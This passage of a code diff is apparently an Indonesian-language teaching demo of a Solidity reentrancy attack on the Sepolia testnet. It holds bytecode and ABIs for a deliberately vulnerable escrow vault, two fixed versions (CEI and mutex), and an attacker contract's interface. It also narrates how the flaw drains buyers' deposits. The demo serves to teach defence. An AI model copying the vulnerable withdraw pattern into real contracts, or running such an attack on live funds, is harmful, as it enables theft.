a26469706673582212209c40003c1d3410c34d9c1c5fbdcfa171eb7cf209f340fb9c1fe1c639d519642d64736f6c634300081c0033' },
+    abi: [{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"orderId","type":"uint256"},{"indexed":true,"internalType":"address","name":"buyer","type":"address"}],"name":"DeliveryConfirmed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"orderId","type":"uint256"},{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"FundsDeposited","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"seller","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"FundsWithdrawn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"orderId","type":"uint256"},{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":true,"internalType":"address","name":"seller","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"OrderCreated","type":"event"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"confirmDelivery","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_seller","type":"address"}],"name":"createOrder","outputs":[{"internalType":"uint256","name":"orderId","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"depositFunds","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"_account","type":"address"}],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"getOrder","outputs":[{"internalType":"address","name":"buyer","type":"address"},{"internalType":"address","name":"seller","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"enum InsecureVault.OrderStatus","name":"status","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"orderCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"orders","outputs":[{"internalType":"address","name":"buyer","type":"address"},{"internalType":"address","name":"seller","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"enum InsecureVault.OrderStatus","name":"status","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],
+    code: `<div class="l hl" id="cl5"><span class="ln">1</span><span class="lc"><span class="cc">// 🔴 CELAH: Interaksi SEBELUM efek (langgar CEI)</span></span></div><div class="l" id="cl2"><span class="ln">2</span><span class="lc"><span style="color:#c084fc">function</span> <span style="color:#60a5fa">withdrawFunds</span>() <span style="color:#c084fc">external</span> {</span></div><div class="l" id="cl3"><span class="ln">3</span><span class="lc">    <span style="color:#888">uint</span> amount = balances[<span style="color:#f59e0b">msg.sender</span>]; <span class="cc">// CHECK</span></span></div><div class="l" id="cl4"><span class="ln">4</span><span class="lc">    <span style="color:#c084fc">require</span>(amount &gt; <span style="color:#f59e0b">0</span>);</span></div><div class="l hl" id="cl5b"><span class="ln">5</span><span class="lc">    (<span style="color:#888">bool</span> success,) = <span style="color:#f59e0b">msg.sender</span>.<span style="color:#60a5fa">call</span>{value:amount}(<span style="color:#22c55e">""</span>); <span class="cc">// 🔴 INTERAKSI (transfer dulu!)</span></span></div><div class="l" id="cl6"><span class="ln">6</span><span class="lc">    <span style="color:#c084fc">require</span>(success);</span></div><div class="l" id="cl7"><span class="ln">7</span><span class="lc">    balances[<span style="color:#f59e0b">msg.sender</span>] = <span style="color:#f59e0b">0</span>; <span class="cc">// ⚠️ EFFECT (SETELAH interaksi — TERLAMBAT!)</span></span></div><div class="l" id="cl8"><span class="ln">8</span><span class="lc">}</span></div>`,
+    getExplanations: (s) => s === 'setup' ? { title:'🌾 Step 1: Inisialisasi Honeypot', body:'Pembeli A deposit <strong>1.5 ETH</strong> (pembayaran 1 ton komoditas) & Pembeli B <strong>0.8 ETH</strong>. Penyerang menyusup sebagai penjual kecil dengan deposit <strong>0.1 ETH</strong>.<br><br>💰 Honeypot: 2.3 ETH | Total escrow: <strong>2.4 ETH</strong>' } : s === 'attack' ? { title:'⚡ Eksploitasi Berlangsung!', body:'<strong style="color:#ef4444">Celah:</strong> baris #5 transfer ETH <span style="color:#ef4444">SEBELUM</span> saldo dikosongkan (baris #7). <strong>Melanggar CEI!</strong><br><br>Penyerang tarik 0.1 ETH → <code>receive()</code> terpicu → panggil <code>withdrawFunds()</code> lagi 🔄 — <strong>menguras 2.4 ETH dalam 1 transaksi!</strong>' } : { title:'✅ Eksploitasi Berhasil', body:'<strong style="color:#ef4444">🔥 2.4 ETH terkuras habis!</strong> Penyerang berhasil menarik total 2.4 ETH (modal 0.1 ETH + curian 2.3 ETH). Saldo kontrak: <strong>0 ETH</strong>.<br><br>Pembeli A & B kehilangan seluruh dana mereka karena celah reentrancy.' }
+  },
+  secure: {
+    name: 'SecureVault', label: '🟢 CEI (Aman)', color: 'green',
+    vaultAddr: '0xdf829d9E6527b219Bf17D6578039445cf12fC811',
+    attAddr: '0xc44109595b6d25c49f33521326f4d291e292A50f',
+    bytecode: { vault: '0x6080604052348015600f57600080fd5b506109d68061001f6000396000f3fe6080604052600436106100955760003560e01c8063a85c38ef11610059578063a85c38ef14610134578063d09ef24114610196578063ea3774e3146101eb578063f8b2cb4f1461020b578063fd84cb971461024157600080fd5b80632453ffa8146100a157806324600fc3146100ca57806327e235e3146100e15780633b76594d1461010e5780636f9fb98a1461012157600080fd5b3661009c57005b600080fd5b3480156100ad57600080fd5b506100b760025481565b6040519081526020015b60405180910390f35b3480156100d657600080fd5b506100df610261565b005b3480156100ed57600080fd5b506100b76100fc3660046108ad565b60016020526000908152604090205481565b6100df61011c3660046108dd565b6103ad565b34801561012d57600080fd5b50476100b7565b34801561014057600080fd5b5061018661014f3660046108dd565b60006020819052908152604090208054600182015460028301546003909301546001600160a01b0392831693919092169160ff1684565b6040516100c1949392919061090c565b3480156101a257600080fd5b506101866101b13660046108dd565b60009081526020819052604090208054600182015460028301546003909301546001600160a01b039283169492909116929160ff90911690565b3480156101f757600080fd5b506100b76102063660046108ad565b610589565b34801561021757600080fd5b506100b76102263660046108ad565b6001600160a01b031660009081526001602052604090205490565b34801561024d57600080fd5b506100df61025c3660046108dd565b610776565b33600090815260016020526040902054806102cd5760405162461bcd60e51b815260206004820152602160248201527f5365637572655661756c743a206e6f2066756e647320746f20776974686472616044820152607760f81b60648201526084015b60405180910390fd5b336000818152600160205260408082208290555190919083908381818185875af1925050503d806000811461031e576040519150601f19603f3d011682016040523d82523d6000602084013e610323565b606091505b50509050806103745760405162461bcd60e51b815260206004820181905260248201527f5365637572655661756c743a20455448207472616e73666572206661696c656460448201526064016102c4565b60405182815233907feaff4b37086828766ad3268786972c0cd24259d4c87a80f9d3963a3c3d999b0d9060200160405180910390a25050565b600081815260208190526040902080546001600160a01b031633146104205760405162461bcd60e51b815260206004820152602360248201527f5365637572655661756c743a206f6e6c792062757965722063616e206465706f6044820152621cda5d60ea1b60648201526084016102c4565b600060038083015460ff169081111561043b5761043b6108f6565b1461049c5760405162461bcd60e51b815260206004820152602b60248201527f5365637572655661756c743a206f72646572206d75737420626520696e20435260448201526a454154454420737461746560a81b60648201526084016102c4565b600034116105035760405162461bcd60e51b815260206004820152602e60248201527f5365637572655661756c743a206465706f736974206d7573742062652067726560448201526d61746572207468616e207a65726f60901b60648201526084016102c4565b346002820181905560038201805460ff19166001908117909155808301546001600160a01b0316600090815260209190915260408120805490919061054990849061096e565b9091555050604051348152339083907fe030e47e27825a2ad1b19e4cf2e70bfbfb3124af275c7727a82b114ba7b29a859060200160405180910390a35050565b60006001600160a01b0382166105f45760405162461bcd60e51b815260206004820152602a60248201527f5365637572655661756c743a2073656c6c65722063616e6e6f74206265207a65604482015269726f206164647265737360b01b60648201526084016102c4565b336001600160a01b038316036106655760405162461bcd60e51b815260206004820152603060248201527f5365637572655661756c743a20627579657220616e642073656c6c657220636160448201526f6e6e6f74206265207468652073616d6560801b60648201526084016102c4565b50600254604080516080810182523381526001600160a01b0384166020820152600091810182905290606082015260008281526020818152604091829020835181546001600160a01b039182166001600160a01b0319918216178355928501516001808401805492909316919094161790559183015160028301556060830151600380840180549293909260ff1916918490811115610706576107066108f6565b021790555050600280549150600061071d83610987565b9190505550816001600160a01b0316336001600160a01b0316827ff9e17940e547201709f9aaacdec8ab3566601c60d8f5affb54f74b79b0b50b13600060405161076991815260200190565b60405180910390a4919050565b600081815260208190526040902080546001600160a01b031633146107f25760405162461bcd60e51b815260206004820152602c60248201527f5365637572655661756c743a206f6e6c792062757965722063616e20636f6e6660448201526b69726d2064656c697665727960a01b60648201526084016102c4565b600160038083015460ff169081111561080d5761080d6108f6565b1461086d5760405162461bcd60e51b815260206004820152602a60248201527f5365637572655661756c743a206f72646572206d75737420626520696e204c4f604482015269434b454420737461746560b01b60648201526084016102c4565b60038101805460ff19166002179055604051339083907f64a783c6150854ae756454311c7625a965c757996ba8cc1a8c6205380f33725090600090a35050565b6000602082840312156108bf57600080fd5b81356001600160a01b03811681146108d657600080fd5b9392505050565b6000602082840312156108ef57600080fd5b5035919050565b634e487b7160e01b600052602160045260246000fd5b6001600160a01b0385811682528416602082015260408101839052608081016004831061094957634e487b7160e01b600052602160045260246000fd5b82606083015295945050505050565b634e487b7160e01b600052601160045260246000fd5b8082018082111561098157610981610958565b92915050565b60006001820161099957610999610958565b506001019056fea2646970667358221220bfcff6e178cb544801518568be9e574aa56240592a1d37511408430705f1348164736f6c634300081c0033' },
+    abi: [{"inputs":[],"name":"getContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"confirmDelivery","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_seller","type":"address"}],"name":"createOrder","outputs":[{"internalType":"uint256","name":"orderId","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"depositFunds","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"_account","type":"address"}],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"getOrder","outputs":[{"internalType":"address","name":"buyer","type":"address"},{"internalType":"address","name":"seller","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint8","name":"status","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"orderCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"orders","outputs":[{"internalType":"address","name":"buyer","type":"address"},{"internalType":"address","name":"seller","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint8","name":"status","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawFunds","outputs":[],"stateMutability":"nonpayable","type":"function"}],
+    code: `<div class="l fix" id="cl5"><span class="ln">1</span><span class="lc"><span class="cc">// ✅ AMAN: Effect DULU, baru Interaksi (CEI compliant)</span></span></div><div class="l" id="cl2"><span class="ln">2</span><span class="lc"><span style="color:#c084fc">function</span> <span style="color:#60a5fa">withdrawFunds</span>() <span style="color:#c084fc">external</span> {</span></div><div class="l" id="cl3"><span class="ln">3</span><span class="lc">    <span style="color:#888">uint</span> amount = balances[<span style="color:#f59e0b">msg.sender</span>]; <span class="cc">// CHECK</span></span></div><div class="l" id="cl4"><span class="ln">4</span><span class="lc">    <span style="color:#c084fc">require</span>(amount &gt; <span style="color:#f59e0b">0</span>);</span></div><div class="l fix" id="cl5b"><span class="ln">5</span><span class="lc">    balances[<span style="color:#f59e0b">msg.sender</span>] = <span style="color:#f59e0b">0</span>; <span class="cc">// ✅ EFFECT DULU! (saldo direset sebelum transfer)</span></span></div><div class="l" id="cl6"><span class="ln">6</span><span class="lc">    (<span style="color:#888">bool</span> success,) = <span style="color:#f59e0b">msg.sender</span>.<span style="color:#60a5fa">call</span>{value:amount}(<span style="color:#22c55e">""</span>); <span class="cc">// INTERAKSI setelah state diupdate</span></span></div><div class="l" id="cl7"><span class="ln">7</span><span class="lc">    <span style="color:#c084fc">require</span>(success);</span></div><div class="l" id="cl8"><span class="ln">8</span><span class="lc">}</span></div>`,
+    getExplanations: (s) => s === 'setup' ? { title:'🌾 Step 1: Setup (CEI)', body:'Pembeli A & B deposit via kontrak dengan pola <strong>CEI</strong>. Penyerang deposit sebagai penjual.<br><br>💡 Mode ringan (0.024 ETH) — cukup untuk buktikan konsep tanpa risiko dana besar.' } : s === 'attack' ? { title:'🛡️ CEI Blokir Serangan!', body:'<strong style="color:#22c55e">✅ CEI memblokir reentrancy!</strong><br><br>Saldo direset <span style="color:#22c55e">SEBELUM</span> transfer ETH. Saat <code>receive()</code> panggil <code>withdrawFunds()</code> lagi, saldo sudah 0 → <strong>revert</strong>.<br><br>🔒 <strong>Dana aman!</strong> Pola CEI efektif cegah reentrancy tanpa library eksternal.' } : { title:'✅ CEI Efektif!', body:'<strong style="color:#22c55e">✅ Pola CEI berhasil!</strong> Dana pembeli aman. Penyerang tidak bisa mencuri — transaksi revert karena saldo sudah 0 sebelum transfer.' }
+  },
+  mutex: {
+    name: 'MutexVault', label: '🟡 Mutex (Lock)', color: 'amber',
+    vaultAddr: '0xBcCce7626FDfB800f319aAdFFEBDc644dc5ef795',
+    attAddr: '0xc44109595b6d25c49f33521326f4d291e292A50f',
+    bytecode: { vault: '0x6080604052348015600f57600080fd5b5060017f9b779b17422d0df92223018b32b4d1fa46e071723d6817e2486d003becc55f0055610a6e806100436000396000f3fe6080604052600436106100955760003560e01c8063a85c38ef11610059578063a85c38ef14610134578063d09ef24114610196578063ea3774e3146101eb578063f8b2cb4f1461020b578063fd84cb971461024157600080fd5b80632453ffa8146100a157806324600fc3146100ca57806327e235e3146100e15780633b76594d1461010e5780636f9fb98a1461012157600080fd5b3661009c57005b600080fd5b3480156100ad57600080fd5b506100b760025481565b6040519081526020015b60405180910390f35b3480156100d657600080fd5b506100df610261565b005b3480156100ed57600080fd5b506100b76100fc366004610945565b60016020526000908152604090205481565b6100df61011c366004610975565b6103dc565b34801561012d57600080fd5b50476100b7565b34801561014057600080fd5b5061018661014f366004610975565b60006020819052908152604090208054600182015460028301546003909301546001600160a01b0392831693919092169160ff1684565b6040516100c194939291906109a4565b3480156101a257600080fd5b506101866101b1366004610975565b60009081526020819052604090208054600182015460028301546003909301546001600160a01b039283169492909116929160ff90911690565b3480156101f757600080fd5b506100b7610206366004610945565b6105b5565b34801561021757600080fd5b506100b7610226366004610945565b6001600160a01b031660009081526001602052604090205490565b34801561024d57600080fd5b506100df61025c366004610975565b6107a0565b6102696108d5565b33600090815260016020526040902054806102cb5760405162461bcd60e51b815260206004820181905260248201527f4d757465785661756c743a206e6f2066756e647320746f20776974686472617760448201526064015b60405180910390fd5b604051600090339083908381818185875af1925050503d806000811461030d576040519150601f19603f3d011682016040523d82523d6000602084013e610312565b606091505b50509050806103635760405162461bcd60e51b815260206004820152601f60248201527f4d757465785661756c743a20455448207472616e73666572206661696c65640060448201526064016102c2565b3360008181526001602052604080822091909155517feaff4b37086828766ad3268786972c0cd24259d4c87a80f9d3963a3c3d999b0d906103a79085815260200190565b60405180910390a250506103da60017f9b779b17422d0df92223018b32b4d1fa46e071723d6817e2486d003becc55f0055565b565b600081815260208190526040902080546001600160a01b0316331461044e5760405162461bcd60e51b815260206004820152602260248201527f4d757465785661756c743a206f6e6c792062757965722063616e206465706f736044820152611a5d60f21b60648201526084016102c2565b600060038083015460ff16908111156104695761046961098e565b146104c95760405162461bcd60e51b815260206004820152602a60248201527f4d757465785661756c743a206f72646572206d75737420626520696e204352456044820152694154454420737461746560b01b60648201526084016102c2565b6000341161052f5760405162461bcd60e51b815260206004820152602d60248201527f4d757465785661756c743a206465706f736974206d757374206265206772656160448201526c746572207468616e207a65726f60981b60648201526084016102c2565b346002820181905560038201805460ff19166001908117909155808301546001600160a01b03166000908152602091909152604081208054909190610575908490610a06565b9091555050604051348152339083907fe030e47e27825a2ad1b19e4cf2e70bfbfb3124af275c7727a82b114ba7b29a859060200160405180910390a35050565b60006001600160a01b03821661061f5760405162461bcd60e51b815260206004820152602960248201527f4d757465785661756c743a2073656c6c65722063616e6e6f74206265207a65726044820152686f206164647265737360b81b60648201526084016102c2565b336001600160a01b0383160361068f5760405162461bcd60e51b815260206004820152602f60248201527f4d757465785661756c743a20627579657220616e642073656c6c65722063616e60448201526e6e6f74206265207468652073616d6560881b60648201526084016102c2565b50600254604080516080810182523381526001600160a01b0384166020820152600091810182905290606082015260008281526020818152604091829020835181546001600160a01b039182166001600160a01b0319918216178355928501516001808401805492909316919094161790559183015160028301556060830151600380840180549293909260ff19169184908111156107305761073061098e565b021790555050600280549150600061074783610a1f565b9190505550816001600160a01b0316336001600160a01b0316827ff9e17940e547201709f9aaacdec8ab3566601c60d8f5affb54f74b79b0b50b13600060405161079391815260200190565b60405180910390a4919050565b600081815260208190526040902080546001600160a01b0316331461081b5760405162461bcd60e51b815260206004820152602b60248201527f4d757465785661756c743a206f6e6c792062757965722063616e20636f6e666960448201526a726d2064656c697665727960a81b60648201526084016102c2565b600160038083015460ff16908111156108365761083661098e565b146108955760405162461bcd60e51b815260206004820152602960248201527f4d757465785661756c743a206f72646572206d75737420626520696e204c4f436044820152684b454420737461746560b81b60648201526084016102c2565b60038101805460ff19166002179055604051339083907f64a783c6150854ae756454311c7625a965c757996ba8cc1a8c6205380f33725090600090a35050565b6108dd610903565b60027f9b779b17422d0df92223018b32b4d1fa46e071723d6817e2486d003becc55f0055565b7f9b779b17422d0df92223018b32b4d1fa46e071723d6817e2486d003becc55f00546002036103da57604051633ee5aeb560e01b815260040160405180910390fd5b60006020828403121561095757600080fd5b81356001600160a01b038116811461096e57600080fd5b9392505050565b60006020828403121561098757600080fd5b5035919050565b634e487b7160e01b600052602160045260246000fd5b6001600160a01b038581168252841660208201526040810183905260808101600483106109e157634e487b7160e01b600052602160045260246000fd5b82606083015295945050505050565b634e487b7160e01b600052601160045260246000fd5b80820180821115610a1957610a196109f0565b92915050565b600060018201610a3157610a316109f0565b506001019056fea26469706673582212200ac415c5257676201106caf45e07b5c8fe12b7bf7d239a296165fc7cad958f5064736f6c634300081c0033' },
+    abi: [{"inputs":[],"name":"getContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"confirmDelivery","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_seller","type":"address"}],"name":"createOrder","outputs":[{"internalType":"uint256","name":"orderId","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"depositFunds","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"_account","type":"address"}],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"getOrder","outputs":[{"internalType":"address","name":"buyer","type":"address"},{"internalType":"address","name":"seller","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint8","name":"status","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"orderCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"orders","outputs":[{"internalType":"address","name":"buyer","type":"address"},{"internalType":"address","name":"seller","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint8","name":"status","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawFunds","outputs":[],"stateMutability":"nonpayable","type":"function"}],
+    code: '<div class="l" id="cl5"><span class="ln">1</span><span class="lc"><span class="cc">// 🟡 Mutex Lock: ReentrancyGuard dari OpenZeppelin</span></span></div><div class="l" id="cl2"><span class="ln">2</span><span class="lc"><span style="color:#c084fc">function</span> <span style="color:#60a5fa">withdrawFunds</span>() <span style="color:#c084fc">external</span> <span style="color:#f59e0b">nonReentrant</span> {</span></div><div class="l" id="cl3"><span class="ln">3</span><span class="lc">    <span style="color:#888">uint</span> amount = balances[<span style="color:#f59e0b">msg.sender</span>]; <span class="cc">// CHECK</span></span></div><div class="l" id="cl4"><span class="ln">4</span><span class="lc">    <span style="color:#c084fc">require</span>(amount &gt; <span style="color:#f59e0b">0</span>);</span></div><div class="l" id="cl5b"><span class="ln">5</span><span class="lc">    (<span style="color:#888">bool</span> success,) = <span style="color:#f59e0b">msg.sender</span>.<span style="color:#60a5fa">call</span>{value:amount}(<span style="color:#22c55e">""</span>); <span class="cc">// INTERAKSI</span></span></div><div class="l" id="cl6"><span class="ln">6</span><span class="lc">    <span style="color:#c084fc">require</span>(success);</span></div><div class="l" id="cl7"><span class="ln">7</span><span class="lc">    balances[<span style="color:#f59e0b">msg.sender</span>] = <span style="color:#f59e0b">0</span>; <span class="cc">// EFFECT</span></span></div><div class="l" id="cl8"><span class="ln">8</span><span class="lc">} <span class="cc">// 🔒 nonReentrant modifier mencegah panggilan berulang</span></span></div>',
+    getExplanations: (s) => s === 'setup' ? { title:'🌾 Step 1: Setup (Mutex)', body:'Kontrak menggunakan <strong>ReentrancyGuard</strong> dari OpenZeppelin — standar industri untuk cegah reentrancy.<br><br>💡 Mode ringan (0.024 ETH) — cukup untuk buktikan konsep.' } : s === 'attack' ? { title:'🟡 Mutex Blokir!', body:'<strong style="color:#f59e0b">✅ Mutex lock memblokir!</strong><br><br><code>nonReentrant</code> mengunci fungsi. Saat <code>receive()</code> panggil <code>withdrawFunds()</code> lagi, 🔒 mutex terkunci → <strong>revert</strong>.<br><br>🔒 <strong>Dana aman!</strong> Meski ada overhead gas untuk operasi locking.' } : { title:'✅ Mutex Efektif!', body:'<strong style="color:#f59e0b">✅ Mutex lock berhasil!</strong> Dana pembeli aman. Namun biaya gas lebih tinggi karena operasi locking tambahan (SSTORE untuk mutex).' }
+  }
+};
+
+const VAULT_ABI = [{"inputs":[],"name":"getContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"confirmDelivery","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_seller","type":"address"}],"name":"createOrder","outputs":[{"internalType":"uint256","name":"orderId","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"depositFunds","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"_account","type":"address"}],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_orderId","type":"uint256"}],"name":"getOrder","outputs":[{"internalType":"address","name":"buyer","type":"address"},{"internalType":"address","name":"seller","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint8","name":"status","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"orderCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"orders","outputs":[{"internalType":"address","name":"buyer","type":"address"},{"internalType":"address","name":"seller","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint8","name":"status","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawFunds","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+const ATTACKER_ABI = [{"inputs":[{"internalType":"address","name":"_target","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"MAX_REENTRIES","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"collectFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getAttackerBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getReentrancyCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"target","outputs":[{"internalType":"contract IVault","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}];
+
+// ===== LOGGING =====
+function log(msg, t='info'){const b=document.getElementById('logBox2'),d=document.createElement('div');d.className='l-'+t;d.textContent=`[${new Date().toLocaleTimeString()}] ${msg}`;b.appendChild(d);b.scrollTop=b.scrollHeight}
+function showAlert(msg,t){const e=document.getElementById('networkAlert');e.className='al al-'+t;e.textContent=msg;e.classList.remove('h')}
+function hideAlert(){document.getElementById('networkAlert').classList.add('h')}
+
+// ===== WALLET =====
+function getWP(){if(window.okxwallet)return window.okxwallet;if(window.ethereum)return window.ethereum;return null}
+function getWN(){if(window.okxwallet)return'OKX';if(window.ethereum)return'MetaMask';return'Wallet'}
+function updateWUI(c,a,w,ch){const d=document.getElementById('dot'),s=document.getElementById('walletStatus'),b=document.getElementById('btnConnect');if(c&&a){d.className='dot on';const ok=(ch===SEPOLIA);s.innerHTML=(ok?`${a.slice(0,6)}...${a.slice(-4)} <span style="font-size:10px;color:#888a9a">(${w}, Sepolia)</span>`:`${a.slice(0,6)}...${a.slice(-4)} <span style="font-size:10px;color:#888a9a">(${w}, Chain ${ch})</span>`);if(ok){b.textContent='✅ Connected';b.className='btn btn-sm btn-success';b.disabled=true}else{b.textContent='⚠️ Wrong Network';b.className='btn btn-sm btn-amber';b.disabled=false}}else{d.className='dot';s.textContent='Wallet disconnected';b.textContent='Connect Wallet';b.className='btn btn-sm btn-primary';b.disabled=false}}
+
+async function connectWallet(){const b=document.getElementById('btnConnect'),wp=getWP(),wn=getWN();if(!wp){log('Wallet tidak terdeteksi!','er');return}
+updateWUI(false);b.disabled=true;b.textContent='Connecting...';try{const a=await withTimeout(wp.request({method:'eth_requestAccounts'}),30000);if(!a||!a.length)throw Error('Tidak ada akun');walletAddr=a[0];provider=new ethers.BrowserProvider(wp);signer=await provider.getSigner();const sa=await signer.getAddress();if(sa.toLowerCase()!==walletAddr.toLowerCase())walletAddr=sa;const net=await withTimeout(provider.getNetwork(),10000);chainId=Number(net.chainId);updateWUI(true,walletAddr,wn,chainId);hideAlert();if(chainId!==SEPOLIA){showAlert(`⚠️ Ganti ke Sepolia. Saat ini: Chain ${chainId}`,'w')}else{log(`Connected: ${walletAddr} (${wn})`,'ok');const bal=await provider.getBalance(walletAddr).catch(()=>'?');log(`Balance: ${typeof bal==='string'?'?':ethers.formatEther(bal)} ETH`,'ok')}
+wp.removeListener('accountsChanged',hAC);wp.removeListener('chainChanged',hCC);wp.on('accountsChanged',hAC);wp.on('chainChanged',hCC)}catch(e){const m=e.name==='TimeoutError'?'Timeout':e.message||String(e);log(`Wallet error: ${m}`,'er');console.error(e);updateWUI(false)}}
+function hAC(){location.reload()}
+function hCC(){location.reload()}
+(async function(){const wp=getWP();if(!wp)return;try{const a=await wp.request({method:'eth_accounts'});if(!a||!a.length)return;walletAddr=a[0];provider=new ethers.BrowserProvider(wp);signer=await provider.getSigner();const net=await withTimeout(provider.getNetwork(),10000);chainId=Number(net.chainId);updateWUI(true,walletAddr,getWN(),chainId);if(chainId!==SEPOLIA){showAlert(`⚠️ Auto-connect: Ganti ke Sepolia. Saat ini: Chain ${chainId}`,'w')}else{hideAlert();log(`Auto-connected: ${walletAddr}`,'ok')}
+wp.removeListener('accountsChanged',hAC);wp.removeListener('chainChanged',hCC);wp.on('accountsChanged',hAC);wp.on('chainChanged',hCC)}catch(e){log(`Auto-connect gagal: ${e.message||e}`,'wa')}})()
+function withTimeout(p,ms){return Promise.race([p,new Promise((_,r)=>setTimeout(()=>{const e=new Error(`Timeout ${ms}ms`);e.name='TimeoutError';r(e)},ms))])}
+
+// ===== MODE SWITCHING =====
+function switchMode(mode) {
+  currentMode = mode;
+  // Reset steps
